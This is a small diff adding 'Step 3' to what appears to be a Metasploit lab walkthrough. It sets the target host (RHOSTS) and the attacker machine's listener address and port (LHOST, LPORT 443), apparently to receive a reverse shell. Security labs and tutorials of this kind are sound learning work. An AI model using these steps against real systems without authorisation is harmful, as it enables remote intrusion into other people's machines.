@@ -52,3 +52,13 @@ set RHOSTS 10.112.189.250 (Target IP)
 ```
 ![Setting RHOST](MetaSpolit-settinghost.png)
 
+Step 3: Configure Payload and Listener Options
+
+I verified the payload settings and configured our local attacker machine's IP (LHOST) and listening port (LPORT).
+```Bash
+
+set LHOST 192.168.137.151
+set LPORT 443
+```
+![Setting Payload](payloads.png)
+
